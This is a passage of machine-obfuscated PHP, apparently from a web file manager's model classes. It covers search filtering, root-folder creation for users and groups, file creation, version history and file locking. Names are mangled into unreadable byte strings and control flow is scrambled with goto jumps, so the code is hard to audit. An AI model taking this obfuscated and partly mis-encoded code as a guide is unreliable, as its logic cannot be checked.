$c®„ø·İâ“[401], $c®„ø·İâ“[356] => array($c®„ø·İâ“[754], $c®„ø·İâ“[2157] . $D®Í¨º“íº[$c®„ø·İâ“[2155]] . $c®„ø·İâ“[2157])); goto DÖÃó¦ÉÂ—; fâ³ÅÈ˜”: } private function _listSearchMerge(&$a–—Ëº¸ÉÍ, $Bã™ÒÂ¼È‹, $D×™œÓ©á, $eØµÂã²¦ª) { goto AšË–šâ©; cĞ»™–îÜÎ: $Aä›» ÂÄÒ = $this->field($D×™œÓ©á)->where($bõ Ò ¸ˆ®)->select(); if (!$Aä›» ÂÄÒ) { return; } $A’À“¶èÃ† = array(); goto c¥Ñƒ½«é¼; c‹è–†ÃÅ©: $Cğ”ƒõò¦ = array_diff($eØµÂã²¦ª, $dº‘Õ¨ÖŸê); if (!$Cğ”ƒõò¦) { return; } $bõ Ò ¸ˆ® = array($b¢‰íÅ¥æ[366] => array($b¢‰íÅ¥æ[7], $Cğ”ƒõò¦)); goto cĞ»™–îÜÎ; c¥Ñƒ½«é¼: foreach ($Aä›» ÂÄÒ as $A¼¶‰î“ó) { $Eù´ùç = $b¢‰íÅ¥æ[47] . $Bã™ÒÂ¼È‹[$b¢‰íÅ¥æ[457]] . $b¢‰íÅ¥æ[47]; if (stripos($A¼¶‰î“ó[$b¢‰íÅ¥æ[455]], $Eù´ùç) !== !1) { $A’À“¶èÃ†[] = $A¼¶‰î“ó; } } $a–—Ëº¸ÉÍ[$b¢‰íÅ¥æ[351]] = array_merge($A’À“¶èÃ†, $a–—Ëº¸ÉÍ[$b¢‰íÅ¥æ[351]]); $a–—Ëº¸ÉÍ[$b¢‰íÅ¥æ[348]][$b¢‰íÅ¥æ[349]] += count($A’À“¶èÃ†); goto FƒÅ³øÕ´÷; AšË–šâ©: $b¢‰íÅ¥æ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$eØµÂã²¦ª) { return; } $dº‘Õ¨ÖŸê = array_to_keyvalue($a–—Ëº¸ÉÍ[$b¢‰íÅ¥æ[351]], $b¢‰íÅ¥æ[33], $b¢‰íÅ¥æ[366]); goto c‹è–†ÃÅ©; FƒÅ³øÕ´÷: } public function listSearchChildren($Cò‹¬Š’, $cÖÒÍÏ•‰Ø = 5000) { goto c†ŸÕ–™ƒ©; c†ŸÕ–™ƒ©: $bæ³–…®óè =& $_SERVER[Äº¡•ô™Ÿ]; $F¦×¹ˆš¨£ = array(); $AöÈ‘¬Åé = $this->sourceInfo($Cò‹¬Š’); goto EÁ»Áè˜Ì; bñáô­œ¦Ï: $BÏÙ…ÁÍó = $this->field($bæ³–…®óè[366])->where($F–Ç”áŒ´œ)->select(); $F¦×¹ˆš¨£ = array_to_keyvalue($BÏÙ…ÁÍó, $bæ³–…®óè[33], $bæ³–…®óè[366]); return $F¦×¹ˆš¨£; goto A¦éš»ìœ³; EÁ»Áè˜Ì: $F–Ç”áŒ´œ = array($bæ³–…®óè[455] => array($bæ³–…®óè[754], $AöÈ‘¬Åé[$bæ³–…®óè[455]] . $AöÈ‘¬Åé[$bæ³–…®óè[366]] . $bæ³–…®óè[480])); $DÁÂš¯‹’Ó = $this->field($bæ³–…®óè[366])->cache(null, 600)->where($F–Ç”áŒ´œ)->count(); if ($DÁÂš¯‹’Ó > $cÖÒÍÏ•‰Ø) { return $this->_listSearchChildrenNear($Cò‹¬Š’, $cÖÒÍÏ•‰Ø); } goto bñáô­œ¦Ï; A¦éš»ìœ³: } private function _listSearchChildrenNear($BÚó’è—¼™, $aã‡£È¯¢’) { goto cÅ´¸»±Œˆ; aæÔğŸ§˜ó: $d«åŸ¢©´ = array_merge($d«åŸ¢©´, array_to_keyvalue($Aô¬À¸¤§ô, $C«œ†•Ğù[33], $C«œ†•Ğù[366])); $d«åŸ¢©´ = array_slice($d«åŸ¢©´, 0, $aã‡£È¯¢’); return $d«åŸ¢©´; goto A“­¥ŞÔàÑ; cÇšÚÑ‰¶É: $Aô¬À¸¤§ô = $this->field($C«œ†•Ğù[2281])->where($dæ¹ÜÈ­Ã)->select(); $e«¸ğÜ©ÄŞ = array_to_keyvalue(array_filter_by_field($Aô¬À¸¤§ô, $C«œ†•Ğù[367], $C«œ†•Ğù[83]), $C«œ†•Ğù[33], $C«œ†•Ğù[366]); $d«åŸ¢©´ = array_merge($d«åŸ¢©´, array_to_keyvalue($Aô¬À¸¤§ô, $C«œ†•Ğù[33], $C«œ†•Ğù[366])); goto Dä ­ŠŠ×İ; cÅ´¸»±Œˆ: $C«œ†•Ğù =& $_SERVER[Äº¡•ô™Ÿ]; $d«åŸ¢©´ = array(); $dæ¹ÜÈ­Ã = array($C«œ†•Ğù[457] => $BÚó’è—¼™); goto cÇšÚÑ‰¶É; Dä ­ŠŠ×İ: if (!$e«¸ğÜ©ÄŞ) { return $d«åŸ¢©´; } $dæ¹ÜÈ­Ã = array($C«œ†•Ğù[457] => array($C«œ†•Ğù[7], $e«¸ğÜ©ÄŞ)); $Aô¬À¸¤§ô = $this->field($C«œ†•Ğù[2281])->where($dæ¹ÜÈ­Ã)->select(); goto aæÔğŸ§˜ó; A“­¥ŞÔàÑ: } private function _listSearchBindPinyin($F“Úã°Ø½‚, &$Cùç‹Ò¶Ë, &$DÛã•Ò·ƒ‹) { goto F«´ÙÀŸğ; F«´ÙÀŸğ: $C‚İÄ¨‘Äª =& $_SERVER[Äº¡•ô™Ÿ]; if (!Input::check($F“Úã°Ø½‚[$C‚İÄ¨‘Äª[2155]], $C‚İÄ¨‘Äª[303]) || strlen($F“Úã°Ø½‚[$C‚İÄ¨‘Äª[2155]]) < 2) { return; } $dÏÃë£ñáœ = "\114\105\106\124\x20\x4a\x4f\111\x4e\40{$this->tablePrefix}\151\x6f\137\x73\157\165\x72\x63\145\137\x6d\x65\164\141\x20\155\x65\164\x61\x20\157\x6e\x20\163\x6f\x75\x72\143\145\x2e\163\x6f\x75\x72\143\x65\x49\104\x20\x3d\x20\x6d\145\164\141\x2e\163\157\x75\x72\143\145\111\104"; goto bì¨½ª¬å; bì¨½ª¬å: $CãŞŞ©öÄ‘ = array(); $DÛã•Ò·ƒ‹ = str_replace(array($C‚İÄ¨‘Äª[214], $C‚İÄ¨‘Äª[50], $C‚İÄ¨‘Äª[2282]), $C‚İÄ¨‘Äª[33], $DÛã•Ò·ƒ‹); $DÛã•Ò·ƒ‹ = $C‚İÄ¨‘Äª[2283] . str_replace($C‚İÄ¨‘Äª[47], $C‚İÄ¨‘Äª[2284], $DÛã•Ò·ƒ‹); goto D‘°ÔÊŠÆ‡; D‘°ÔÊŠÆ‡: unset($Cùç‹Ò¶Ë[$C‚İÄ¨‘Äª[28]]); foreach ($Cùç‹Ò¶Ë as $C…Ù¹óå => $bã¦‚ËÖ—è) { $CãŞŞ©öÄ‘[$C‚İÄ¨‘Äª[2283] . $C…Ù¹óå] = $bã¦‚ËÖ—è; } $e—åŞ¥á¿ = array($C‚İÄ¨‘Äª[479], $C‚İÄ¨‘Äª[2157] . $F“Úã°Ø½‚[$C‚İÄ¨‘Äª[2155]] . $C‚İÄ¨‘Äª[2157]); goto cæ×êë‹…Í; cæ×êë‹…Í: $CãŞŞ©öÄ‘[] = array($C‚İÄ¨‘Äª[2285] => $e—åŞ¥á¿, $C‚İÄ¨‘Äª[916] => $C‚İÄ¨‘Äª[2159], array($C‚İÄ¨‘Äª[2286] => $e—åŞ¥á¿, $C‚İÄ¨‘Äª[2287] => array($C‚İÄ¨‘Äª[7], array($C‚İÄ¨‘Äª[412], $C‚İÄ¨‘Äª[411])))); $this->join($dÏÃë£ñáœ); $Cùç‹Ò¶Ë = $CãŞŞ©öÄ‘; goto aéÒŒã»Å; aéÒŒã»Å: } private function _parseSearchWhere($BŠ˜ÏßÉø) { goto a„®ÄÓ°‰; dÌìÆ¯Ù§Ô: if (isset($BŠ˜ÏßÉø[$Bê±Úë‰È[706]])) { $fÂÏ™ÌøÁê = array($Bê±Úë‰È[2289], $BŠ˜ÏßÉø[$Bê±Úë‰È[706]]); if ($A†å¬…×˜[$Bê±Úë‰È[107]]) { $A†å¬…×˜[$Bê±Úë‰È[107]] = array($A†å¬…×˜[$Bê±Úë‰È[107]], $fÂÏ™ÌøÁê, $Bê±Úë‰È[2290]); } else { $A†å¬…×˜[$Bê±Úë‰È[107]] = $fÂÏ™ÌøÁê; } } if (isset($BŠ˜ÏßÉø[$Bê±Úë‰È[2291]])) { $A†å¬…×˜[$Bê±Úë‰È[77]] = array($Bê±Úë‰È[2288], $BŠ˜ÏßÉø[$Bê±Úë‰È[2291]]); } if (isset($BŠ˜ÏßÉø[$Bê±Úë‰È[2292]])) { $fÂÏ™ÌøÁê = array($Bê±Úë‰È[2289], $BŠ˜ÏßÉø[$Bê±Úë‰È[2292]]); if ($A†å¬…×˜[$Bê±Úë‰È[77]]) { $A†å¬…×˜[$Bê±Úë‰È[77]] = array($A†å¬…×˜[$Bê±Úë‰È[77]], $fÂÏ™ÌøÁê, $Bê±Úë‰È[2290]); } else { $A†å¬…×˜[$Bê±Úë‰È[77]] = $fÂÏ™ÌøÁê; } } goto d¨šµëÆ“ë; a„®ÄÓ°‰: $Bê±Úë‰È =& $_SERVER[Äº¡•ô™Ÿ]; $A†å¬…×˜ = array(); if (isset($BŠ˜ÏßÉø[$Bê±Úë‰È[705]])) { $A†å¬…×˜[$Bê±Úë‰È[107]] = array($Bê±Úë‰È[2288], $BŠ˜ÏßÉø[$Bê±Úë‰È[705]]); } goto dÌìÆ¯Ù§Ô; f ˆÎ®„¸‚: if (isset($BŠ˜ÏßÉø[$Bê±Úë‰È[2155]]) && $BŠ˜ÏßÉø[$Bê±Úë‰È[2155]]) { $bä•ÎÇ‹¶É = $BŠ˜ÏßÉø[$Bê±Úë‰È[2155]]; $E±ƒİ”êˆº = explode($Bê±Úë‰È[50], $bä•ÎÇ‹¶É); if (strlen($bä•ÎÇ‹¶É) > 2 && (substr($bä•ÎÇ‹¶É, 0, 1) == $Bê±Úë‰È[113] && substr($bä•ÎÇ‹¶É, -1) == $Bê±Úë‰È[113]) || substr($bä•ÎÇ‹¶É, 0, 1) == $Bê±Úë‰È[55] && substr($bä•ÎÇ‹¶É, -1) == $Bê±Úë‰È[55]) { $bä•ÎÇ‹¶É = substr($bä•ÎÇ‹¶É, 1, -1); $E±ƒİ”êˆº = array($bä•ÎÇ‹¶É); } $A†å¬…×˜[$Bê±Úë‰È[28]] = array($Bê±Úë‰È[479], $Bê±Úë‰È[2157] . $bä•ÎÇ‹¶É . $Bê±Úë‰È[2157]); if (count($E±ƒİ”êˆº) > 1) { $A†å¬…×˜[$Bê±Úë‰È[28]] = array(); foreach ($E±ƒİ”êˆº as $eÅŠÍ…ÔõÑ) { if (!trim($eÅŠÍ…ÔõÑ)) { continue; } $A†å¬…×˜[$Bê±Úë‰È[28]][] = array($Bê±Úë‰È[479], $Bê±Úë‰È[2157] . trim($eÅŠÍ…ÔõÑ) . $Bê±Úë‰È[2157]); } } } return $A†å¬…×˜; goto Fˆìˆ‹¼È½; d¨šµëÆ“ë: if (isset($BŠ˜ÏßÉø[$Bê±Úë‰È[531]])) { $A†å¬…×˜[] = array($Bê±Úë‰È[376] => $BŠ˜ÏßÉø[$Bê±Úë‰È[531]], $Bê±Úë‰È[375] => $BŠ˜ÏßÉø[$Bê±Úë‰È[531]], $Bê±Úë‰È[916] => $Bê±Úë‰È[2159]); } if (isset($BŠ˜ÏßÉø[$Bê±Úë‰È[369]])) { $cŠè¼”×õî = $BŠ˜ÏßÉø[$Bê±Úë‰È[369]]; if ($cŠè¼”×õî == $Bê±Úë‰È[76]) { $A†å¬…×˜[$Bê±Úë‰È[367]] = 1; } else { if ($cŠè¼”×õî == $Bê±Úë‰È[2293]) { $A†å¬…×˜[$Bê±Úë‰È[367]] = 0; } else { if ($cŠè¼”×õî) { $cŠè¼”×õî = is_array($cŠè¼”×õî) ? $cŠè¼”×õî : explode($Bê±Úë‰È[47], $cŠè¼”×õî); $A†å¬…×˜[$Bê±Úë‰È[369]] = array($Bê±Úë‰È[381], $cŠè¼”×õî); $A†å¬…×˜[$Bê±Úë‰È[367]] = 0; } } } } if (isset($BŠ˜ÏßÉø[$Bê±Úë‰È[457]])) { $dÔğˆ¾Á¦ç = $this->sourceInfo($BŠ˜ÏßÉø[$Bê±Úë‰È[457]]); $A†å¬…×˜[$Bê±Úë‰È[521]] = array($Bê±Úë‰È[479], $dÔğˆ¾Á¦ç[$Bê±Úë‰È[455]] . $BŠ˜ÏßÉø[$Bê±Úë‰È[457]] . $Bê±Úë‰È[480]); } goto f ˆÎ®„¸‚; Fˆìˆ‹¼È½: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($B´ŞÑÑçˆ) { $C§ä¥””Éª =& $_SERVER[Äº¡•ô™Ÿ]; $a…½Ö‘Èî = Model($C§ä¥””Éª[470])->where(array($C§ä¥””Éª[1407] => $B´ŞÑÑçˆ))->find(); $C‚‚¤ŒŞ– = $this->_mkdirRoot(SourceModel::TYPE_USER, $B´ŞÑÑçˆ, $a…½Ö‘Èî[$C§ä¥””Éª[28]]); $this->userDesktopAdd($C‚‚¤ŒŞ–); return $C‚‚¤ŒŞ–; } public function userDesktopAdd($cø® ÑŞ®ª) { $Aó­•ã’Ä× =& $_SERVER[Äº¡•ô™Ÿ]; $A½İÈĞÈÊ = LNG($Aó­•ã’Ä×[2294]); $D”‰–ª‚ Í = $this->mkdir($cø® ÑŞ®ª, $A½İÈĞÈÊ); $this->metaSet($D”‰–ª‚ Í, $Aó­•ã’Ä×[2295], $Aó­•ã’Ä×[83]); $this->metaSet($cø® ÑŞ®ª, $Aó­•ã’Ä×[2296], $D”‰–ª‚ Í); } public function groupRootAdd($d•Ñ…¯ÂÎÆ) { $fã÷±ìšÊá =& $_SERVER[Äº¡•ô™Ÿ]; $BÄ¨ŸÈÌ“› = Model($fã÷±ìšÊá[454])->where(array($fã÷±ìšÊá[2151] => $d•Ñ…¯ÂÎÆ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $d•Ñ…¯ÂÎÆ, $BÄ¨ŸÈÌ“›[$fã÷±ìšÊá[28]]); } public function systemRootPathAdd($Døïíêµº®) { if ($Døïíêµº® != $_SERVER[Äº¡•ô™Ÿ][1089]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $Døïíêµº®); } public function userRootRemove($Dî¢çƒ»Øï) { $a‹Ô©´ÇÎ‚ = $this->sourceRoot(SourceModel::TYPE_USER, $Dî¢çƒ»Øï); if (!$a‹Ô©´ÇÎ‚) { return; } $this->remove($a‹Ô©´ÇÎ‚, !1); } public function groupRootRemove($AŸñ„…ÜÜ) { $añ×…ˆ­‘´ = $this->sourceRoot(SourceModel::TYPE_GROUP, $AŸñ„…ÜÜ); if (!$añ×…ˆ­‘´) { return; } $this->remove($añ×…ˆ­‘´, !1); } private function _mkdirRoot($c¨î™“º, $b¡ƒ¢â, $e±Õéğ«¾˜) { goto D¦Ñí–®Ï ; D¦Ñí–®Ï : $f†ÒçÒçÆŸ =& $_SERVER[Äº¡•ô™Ÿ]; $a¾®ˆç  = array($f†ÒçÒçÆŸ[365] => 0, $f†ÒçÒçÆŸ[517] => $c¨î™“º, $f†ÒçÒçÆŸ[518] => $b¡ƒ¢â, $f†ÒçÒçÆŸ[514] => 1, $f†ÒçÒçÆŸ[519] => USER_ID, $f†ÒçÒçÆŸ[520] => USER_ID, $f†ÒçÒçÆŸ[515] => $f†ÒçÒçÆŸ[33], $f†ÒçÒçÆŸ[521] => $f†ÒçÒçÆŸ[466], $f†ÒçÒçÆŸ[392] => 0, $f†ÒçÒçÆŸ[516] => 0, $f†ÒçÒçÆŸ[416] => 0, $f†ÒçÒçÆŸ[522] => $f†ÒçÒçÆŸ[33]); if ($Bƒ­Š²Ú † = $this->where($a¾®ˆç )->find()) { return $Bƒ­Š²Ú †[$f†ÒçÒçÆŸ[366]]; } goto Fº¯µÍèªÉ; FãÍ³³¢‹è: $fí±½©Ó‚± = $this->add($a¾®ˆç ); $a‡œÛÒšˆ = array($f†ÒçÒçÆŸ[523] => short_id($fí±½©Ó‚±)); $this->where(array($f†ÒçÒçÆŸ[380] => $fí±½©Ó‚±))->save($a‡œÛÒšˆ); goto aÅ‰·…ë„Ê; aÅ‰·…ë„Ê: CacheLock::unlock($B¹Õ“Ş½ÔÓ); return $fí±½©Ó‚±; goto e—‹Ëø”±; Fº¯µÍèªÉ: $B¹Õ“Ş½ÔÓ = "\x4d\x6f\x64\x65\154\x53\157\x75\162\143\145\56\x6d\x6b\x64\x69\162\x52\157\157\164\x2e{$c¨î™“º}\x2e{$b¡ƒ¢â}\56" . $e±Õéğ«¾˜; CacheLock::lock($B¹Õ“Ş½ÔÓ); $a¾®ˆç [$f†ÒçÒçÆŸ[28]] = $e±Õéğ«¾˜; goto FãÍ³³¢‹è; e—‹Ëø”±: } private function sourceRoot($BõÏæ«„—¾, $EàæÒ³Ú©, $A“”èœ¾Í‚ = false) { $eó¶ÇëßõŠ =& $_SERVER[Äº¡•ô™Ÿ]; $D„•²²¬Äö = array($eó¶ÇëßõŠ[365] => 0, $eó¶ÇëßõŠ[517] => $BõÏæ«„—¾, $eó¶ÇëßõŠ[518] => $EàæÒ³Ú©); if ($dß†³ğÈŒÍ = $this->where($D„•²²¬Äö)->find()) { return $A“”èœ¾Í‚ ? $dß†³ğÈŒÍ : $dß†³ğÈŒÍ[$eó¶ÇëßõŠ[366]]; } return !1; } public function sourceRootGroup($E—Æ²Œ¯ùö) { $c‰ÍÙ»çŸ =& $_SERVER[Äº¡•ô™Ÿ]; if (is_string($E—Æ²Œ¯ùö)) { $E—Æ²Œ¯ùö = array($E—Æ²Œ¯ùö); } $aÅ›¼¼¯ˆ = array($c‰ÍÙ»çŸ[365] => 0, $c‰ÍÙ»çŸ[517] => SourceModel::TYPE_GROUP, $c‰ÍÙ»çŸ[518] => array($c‰ÍÙ»çŸ[7], $E—Æ²Œ¯ùö)); $B‚Ú‡ò±Æ— = $this->listSource($aÅ›¼¼¯ˆ, 1000); return array_to_keyvalue($B‚Ú‡ò±Æ—[$c‰ÍÙ»çŸ[74]], $c‰ÍÙ»çŸ[452]); } public function mkfile($eõÈ‰Ç‹–§, $Fªà‡²²ô», $aòƒ¸øÑÔ = '', $bù’³¦«ö¸ = REPEAT_RENAME) { $C´•íµŒ¬ =& $_SERVER[Äº¡•ô™Ÿ]; $dÌòøê­Ô = Model($C´•íµŒ¬[540])->addFileByContent($aòƒ¸øÑÔ, $Fªà‡²²ô»); return $this->_createFileCall($eõÈ‰Ç‹–§, $Fªà‡²²ô», $dÌòøê­Ô, $bù’³¦«ö¸, $C´•íµŒ¬[1118]); } public function addFile($eõŒÏíİÇ, $b§èšµ´¶…, $d¬ˆÈ…Éà, $E¬ÉâêºâŒ = false, $Fø¦åÌ“ñ = REPEAT_RENAME) { $CËĞ±Æ¯˜È = Model($_SERVER[Äº¡•ô™Ÿ][540])->addFile($b§èšµ´¶…, $d¬ˆÈ…Éà, $E¬ÉâêºâŒ); return $this->_createFileCall($eõŒÏíİÇ, $d¬ˆÈ…Éà, $CËĞ±Æ¯˜È, $Fø¦åÌ“ñ); } public function addFileByFileID($D±¿Ûèò´, $DÔÆ…©õ‡Ã, $A…î§†šÀ , $bÌô ‡£¬ = REPEAT_RENAME) { $C¸åÉÑÖ«´ =& $_SERVER[Äº¡•ô™Ÿ]; $AîÕÓíµ³ = Model($C¸åÉÑÖ«´[540])->find($DÔÆ…©õ‡Ã); Model($C¸åÉÑÖ«´[540])->linkAdd($DÔÆ…©õ‡Ã); return $this->_createFileCall($D±¿Ûèò´, $A…î§†šÀ , $AîÕÓíµ³, $bÌô ‡£¬); } public function addFileByRemote($CŠëğƒ†á, $aªøÑ¿¹‹, $CÚÌÌ­ÎÒ, $bƒœ—’­¨­ = array(), $FĞª•òÌÒ = REPEAT_RENAME) { $eÀíÈ‹÷ìæ = Model($_SERVER[Äº¡•ô™Ÿ][540])->addFileByRemote($aªøÑ¿¹‹, $CÚÌÌ­ÎÒ, $bƒœ—’­¨­); return $this->_createFileCall($CŠëğƒ†á, $CÚÌÌ­ÎÒ, $eÀíÈ‹÷ìæ, $FĞª•òÌÒ); } private function _createFileCall($f´½†‡ğ•ª, $AòÒƒìŸ§, $dè·¯øŸä×, $A—µ‹Ãñ¬Õ, $dõ‚ŠÁ“˜† = "\x75\160\154\x6f\141\144") { goto e©Æò±ÇÓğ; b…ÌÏöÓÏÕ: return $AÚ°Ë³Ê¸; goto EŠËªô†; e©Æò±ÇÓğ: $A„£öé¨¾Ñ =& $_SERVER[Äº¡•ô™Ÿ]; $f¾¿øÄÂ¾ = !1; $this->lockWriteStart($f´½†‡ğ•ª, $AòÒƒìŸ§); goto a’õë£°¡Ü; a’õë£°¡Ü: $AÚ°Ë³Ê¸ = $this->_createFile($f´½†‡ğ•ª, $AòÒƒìŸ§, $dè·¯øŸä×, $A—µ‹Ãñ¬Õ, $f¾¿øÄÂ¾); if (!$f¾¿øÄÂ¾) { Model($A„£öé¨¾Ñ[418])->remove($dè·¯øŸä×[$A„£öé¨¾Ñ[415]]); } else { if ($AÚ°Ë³Ê¸) { Model($A„£öé¨¾Ñ[2266])->eventCreate($AÚ°Ë³Ê¸, $dõ‚ŠÁ“˜†); } } $this->lockWriteEnd($f´½†‡ğ•ª, $AòÒƒìŸ§); goto b…ÌÏöÓÏÕ; EŠËªô†: } public function mkdir($eçª¢·áºÃ, $a‰—óçó¯•, $FÎ‚æœÄ¥ = REPEAT_SKIP) { goto B‡ÕÅ¿¤‰; f³¡‘ ƒñ™: $f¯Àßá…œ¯ = $this->_addSoure($A¨øŒŸ†šö, $CïÑ¶·‘¨); Model($AÂï¾Îˆƒµ[2266])->eventCreate($f¯Àßá…œ¯, $AÂï¾Îˆƒµ[1119]); $this->lockWriteEnd($eçª¢·áºÃ, $a‰—óçó¯•); goto d§Õ¦¹ß¥¼; D £©‹Ö ±: $this->lockWriteStart($eçª¢·áºÃ, $a‰—óçó¯•); if ($FÎ‚æœÄ¥ !== !1) { $bˆ­è…Å“ = $this->fileNameExist($eçª¢·áºÃ, $a‰—óçó¯•); if ($bˆ­è…Å“ && $FÎ‚æœÄ¥ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($eçª¢·áºÃ, $a‰—óçó¯•); return $bˆ­è…Å“; } $a‰—óçó¯• = $this->fileNameAuto($eçª¢·áºÃ, $a‰—óçó¯•, $FÎ‚æœÄ¥); } $A¨øŒŸ†šö = array($AÂï¾Îˆƒµ[514] => 1, $AÂï¾Îˆƒµ[383] => $a‰—óçó¯•, $AÂï¾Îˆƒµ[515] => $AÂï¾Îˆƒµ[33], $AÂï¾Îˆƒµ[416] => 0, $AÂï¾Îˆƒµ[516] => 0); goto f³¡‘ ƒñ™; B‡ÕÅ¿¤‰: $AÂï¾Îˆƒµ =& $_SERVER[Äº¡•ô™Ÿ]; $CïÑ¶·‘¨ = $this->sourceInfo($eçª¢·áºÃ); if (!$CïÑ¶·‘¨) { return !1; } goto D £©‹Ö ±; d§Õ¦¹ß¥¼: return $f¯Àßá…œ¯; goto Fğ‡ø¹·Ë™; Fğ‡ø¹·Ë™: } private function _createFile($fÜÉÇÓ·, $dá’ˆÎ“Ì„, $A†ŞÙ±‰½ƒ, $eê–—ˆ Õ, &$F–ÙôÆËã˜) { goto eª¼²­æÏÎ; eª¼²­æÏÎ: $f§­ÆªùÙÇ =& $_SERVER[Äº¡•ô™Ÿ]; $a³†‡ºÜÇ = $this->sourceInfo($fÜÉÇÓ·); if (!$A†ŞÙ±‰½ƒ || !$a³†‡ºÜÇ) { return !1; } goto b«ÛÕÇßê; b«ÛÕÇßê: if ($eê–—ˆ Õ !== !1) { $B¨Àóİ°„” = $this->fileNameExist($fÜÉÇÓ·, $dá’ˆÎ“Ì„); } $F–ÙôÆËã˜ = !0; if ($eê–—ˆ Õ && $B¨Àóİ°„”) { if ($eê–—ˆ Õ == REPEAT_SKIP) { $F–ÙôÆËã˜ = !1; return $B¨Àóİ°„”; } else { if ($eê–—ˆ Õ == REPEAT_REPLACE) { $cˆªç¡ÕŸ = $this->sourceInfo($B¨Àóİ°„”); $EŞ…“ôõäé = $this->fileHistory($cˆªç¡ÕŸ, $A†ŞÙ±‰½ƒ[$f§­ÆªùÙÇ[415]], $A†ŞÙ±‰½ƒ[$f§­ÆªùÙÇ[77]]); if (!$EŞ…“ôõäé) { $F–ÙôÆËã˜ = !1; } else { $this->folderSizeReset($fÜÉÇÓ·); } return $B¨Àóİ°„”; } else { $dá’ˆÎ“Ì„ = $this->fileNameAuto($fÜÉÇÓ·, $dá’ˆÎ“Ì„, $eê–—ˆ Õ, !1); } } } goto A´ÇØ‡‚Ò; A´ÇØ‡‚Ò: $E«Áù–¯– = array($f§­ÆªùÙÇ[514] => 0, $f§­ÆªùÙÇ[383] => $dá’ˆÎ“Ì„, $f§­ÆªùÙÇ[515] => get_path_ext($dá’ˆÎ“Ì„), $f§­ÆªùÙÇ[416] => $A†ŞÙ±‰½ƒ[$f§­ÆªùÙÇ[415]], $f§­ÆªùÙÇ[516] => $A†ŞÙ±‰½ƒ[$f§­ÆªùÙÇ[77]]); $AÕ—ïÎ‹Á = $this->_addSoure($E«Áù–¯–, $a³†‡ºÜÇ); $this->folderSizeReset($fÜÉÇÓ·); goto bŞó³ä…çÜ; bŞó³ä…çÜ: return $AÕ—ïÎ‹Á; goto F£àœ“Ã; F£àœ“Ã: } protected function fileHistory($DÃ—ƒÜµ ·, $Eñ¤ª–±Áò, $fßİê‰¾»Ê) { goto Eé‚ï“¤¼…; Eé‚ï“¤¼…: $c¿Š¶õóÚ‰ =& $_SERVER[Äº¡•ô™Ÿ]; if ($DÃ—ƒÜµ ·[$c¿Š¶õóÚ‰[415]] == $Eñ¤ª–±Áò) { return !1; } $this->checkLock($DÃ—ƒÜµ ·[$c¿Š¶õóÚ‰[366]], $Eñ¤ª–±Áò); goto Aø¾°¼Ü‘É; Aø¾°¼Ü‘É: Model($c¿Š¶õóÚ‰[2297])->addHistory($DÃ—ƒÜµ ·); $cËØõ§®õÎ = array($c¿Š¶õóÚ‰[520] => USER_ID, $c¿Š¶õóÚ‰[387] => time(), $c¿Š¶õóÚ‰[415] => $Eñ¤ª–±Áò, $c¿Š¶õóÚ‰[77] => $fßİê‰¾»Ê); $this->where(array($c¿Š¶õóÚ‰[380] => $DÃ—ƒÜµ ·[$c¿Š¶õóÚ‰[366]]))->save($cËØõ§®õÎ); goto aÏÇËè‚õ÷; aÏÇËè‚õ÷: return !0; goto eÌ¹‚•ì‘º; eÌ¹‚•ì‘º: } public function checkLock($dÕ¥¼šæ , $bËï»Í—¯æ) { goto B½áÍ÷Ø“ê; B½áÍ÷Ø“ê: $fÔ„Æ»á” =& $_SERVER[Äº¡•ô™Ÿ]; $cÉµÔ±± = $this->pathInfo($dÕ¥¼šæ ); if (!$this->fileIsLock($cÉµÔ±±, !0)) { return; } goto C©èò×‡Ü’; e‰æÕÉÊáß: $this->_createFileCall($cÉµÔ±±[$fÔ„Æ»á”[457]], $Cì“æÏìˆ¬, $B¡òÛŠ°™, REPEAT_REPLACE, $fÔ„Æ»á”[1118]); $F¾ˆ„·„ÕĞ = $cÉµÔ±±[$fÔ„Æ»á”[413]][$fÔ„Æ»á”[477]]; $D—èâ¥ªÅ  = $F¾ˆ„·„ÕĞ[$fÔ„Æ»á”[2299]] ? $F¾ˆ„·„ÕĞ[$fÔ„Æ»á”[2299]] : $F¾ˆ„·„ÕĞ[$fÔ„Æ»á”[28]]; goto D……ĞäÜâË; C©èò×‡Ü’: $b´Ò†—“àó = Session::get($fÔ„Æ»á”[2298]); $Cì“æÏìˆ¬ = substr($cÉµÔ±±[$fÔ„Æ»á”[28]], 0, -1 - strlen($cÉµÔ±±[$fÔ„Æ»á”[157]])) . $fÔ„Æ»á”[1369] . $b´Ò†—“àó . $fÔ„Æ»á”[93] . $cÉµÔ±±[$fÔ„Æ»á”[157]]; $B¡òÛŠ°™ = Model($fÔ„Æ»á”[540])->find($bËï»Í—¯æ); goto e‰æÕÉÊáß; D……ĞäÜâË: show_json(LNG($fÔ„Æ»á”[2300]) . $fÔ„Æ»á”[2301] . LNG($fÔ„Æ»á”[2302]) . $fÔ„Æ»á”[2303] . $D—èâ¥ªÅ  . $fÔ„Æ»á”[2304], !1); goto AíÇÜ­’‘†; AíÇÜ­’‘†: } public function fileIsLock($aßÚ¾Èéï–, $F“ß†™„Èà = false) { goto fÌ³ášó¿Û; C‹ÓÓ ğÍ‚: return !1; goto B„…÷ì¥‡; c¨—ğ‚¤Ùš: $cÕÚŠ‚ƒà¼ = $GLOBALS[$BŒÄŠÁ¢È‰[6]][$BŒÄŠÁ¢È‰[84]][$BŒÄŠÁ¢È‰[475]]; if ($aßÚ¾Èéï–[$BŒÄŠÁ¢È‰[413]][$BŒÄŠÁ¢È‰[476]] <= time() - $cÕÚŠ‚ƒà¼) { $this->metaSet($aßÚ¾Èéï–[$BŒÄŠÁ¢È‰[366]], $BŒÄŠÁ¢È‰[474], null); $this->metaSet($aßÚ¾Èéï–[$BŒÄŠÁ¢È‰[366]], $BŒÄŠÁ¢È‰[476], null); } if ($F“ß†™„Èà) { $this->metaSet($aßÚ¾Èéï–[$BŒÄŠÁ¢È‰[366]], $BŒÄŠÁ¢È‰[476], time()); } goto C‹ÓÓ ğÍ‚; fÌ³ášó¿Û: $BŒÄŠÁ¢È‰ =& $_SERVER[Äº¡•ô™Ÿ]; if (!isset($aßÚ¾Èéï–[$BŒÄŠÁ¢È‰[413]]) || 